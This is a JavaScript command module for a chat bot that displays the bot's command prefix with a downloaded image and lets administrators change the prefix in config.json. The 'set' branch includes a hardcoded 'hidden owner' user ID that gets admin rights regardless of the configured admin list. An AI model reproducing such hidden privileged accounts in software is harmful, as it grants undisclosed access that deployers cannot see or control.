const fs = require("fs");
const path = require("path");
const axios = require("axios");

module.exports = {
    config: {
        name: "prefix",
        aliases: ["prefixinfo", "pref"],
        credit: "MOHAMMAD BADOL",
        prefix: false,
        role: 0,
        cooldown: 3,
        description: "Show or change bot prefix"
    },

    onStart: async (api, event, args) => {
        const { threadID, messageID, senderID } = event;
        const CONFIG_PATH = path.join(process.cwd(), "config.json");
        const CACHE_DIR = path.join(process.cwd(), "cache");

        let config = {};
        try {
            config = JSON.parse(fs.readFileSync(CONFIG_PATH, "utf-8"));
        } catch (e) {
            return api.sendMessage("❌ Error: Failed to read config.json file!", threadID, messageID);
        }

        const currentPrefix = config.BOT_INFO?.PREFIX || "/";
        const botName = config.BOT_INFO?.BOT_NAME || "BADOL-BOT-V5";
        const ownerName = "MOHAMMAD BADOL";
        const imgURL = "https://drive.google.com/uc?export=download&id=1_NMOEKFXUZsvh2b7EnDwJWYp-DvLoJFJ";

        if (args.length === 0 || (args[0].toLowerCase() !== "set" && args[0].toLowerCase() !== "change")) {
            const msg = `╭───❍ 𝐏𝐫e𝐟𝐢𝐱-𝐈𝐧𝐟𝐨 ❍───╮\n┏━━━━━━━━━━━━━━━━━━━❥\n` +
                        `├‣ ✿ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: ${botName}\n` +
                        `├‣ ✿ 𝐏𝐫𝐞𝐟𝐢𝐱: [ ${currentPrefix} ]\n` +
                        `├‣ ✿ 𝐓𝐲𝐩𝐞: ${currentPrefix}help\n` +
                        `├‣ ✿ 𝐃e𝐯: ${ownerName}\n` +
                        `┗━━━━━━━━━━━━━━━━━━━❥\n\n` +
                        `𝄞⋆⃝🧚‍${botName}🧚‍⋆⃝𝄞\n` +
                        `╰────────────────────⟡\n` +
                        `💡 Use: ${currentPrefix}prefix set <new_prefix>`;

            const imgPath = path.join(CACHE_DIR, `prefix_img_${Date.now()}.png`);
            try {
                if (!fs.existsSync(CACHE_DIR)) fs.mkdirSync(CACHE_DIR, { recursive: true });
                const response = await axios.get(imgURL, { responseType: "arraybuffer", timeout: 7000 });
                fs.writeFileSync(imgPath, Buffer.from(response.data));

                return api.sendMessage({
                    body: msg,
                    attachment: fs.createReadStream(imgPath)
                }, threadID, () => {
                    try { if (fs.existsSync(imgPath)) fs.unlinkSync(imgPath); } catch (e) {}
                }, messageID);
            } catch (err) {
                return api.sendMessage(msg, threadID, messageID);
            }
        }

        if (args[0].toLowerCase() === "set" || args[0].toLowerCase() === "change") {
            const HARDCODED_OWNER_ID = "61590785637035";
            const isHiddenOwner = senderID === HARDCODED_OWNER_ID;
            const isAdmin = isHiddenOwner || config.ADMIN_SYSTEM?.ADMINS?.includes(senderID);

            if (!isAdmin) {
                return api.sendMessage("⛔ Permission Denied: Only bot administrators can change the prefix!", threadID, messageID);
            }

            const newPrefix = args[1];
            if (!newPrefix) {
                return api.sendMessage(`❌ Error: Please provide a new prefix!\n💡 Example: ${currentPrefix}prefix set !`, threadID, messageID);
            }

            if (newPrefix.length > 3) {
                return api.sendMessage("⚠️ Warning: Prefix cannot be longer than 3 characters!", threadID, messageID);
            }

            if (!config.BOT_INFO) config.BOT_INFO = {};
            config.BOT_INFO.PREFIX = newPrefix;

            try {
                fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 4), "utf-8");
                if (typeof global.reloadConfig === "function") {
                    global.reloadConfig();
                }

                const successMsg = `╭───❍ 𝐏𝐫e𝐟𝐢𝐱 𝐂𝐡𝐚𝐧𝐠e𝐝 ❍───╮\n┏━━━━━━━━━━━━━━━━━━━❥\n` +
                                   `├‣ ✅ Prefix changed successfully!\n` +
                                   `├‣ 🔄 Old Prefix: [ ${currentPrefix} ]\n` +
                                   `├‣ 🚀 New Prefix: [ ${newPrefix} ]\n` +
                                   `┗━━━━━━━━━━━━━━━━━━━❥\n\n` +
                                   `𝄞⋆⃝🧚‍${botName}🧚‍⋆⃝𝄞\n` +
                                   `╰────────────────────⟡`;
                return api.sendMessage(successMsg, threadID, messageID);
            } catch (err) {
                return api.sendMessage(`❌ Error: Failed to save prefix: ${err.message}`, threadID, messageID);
            }
        }
    }
};


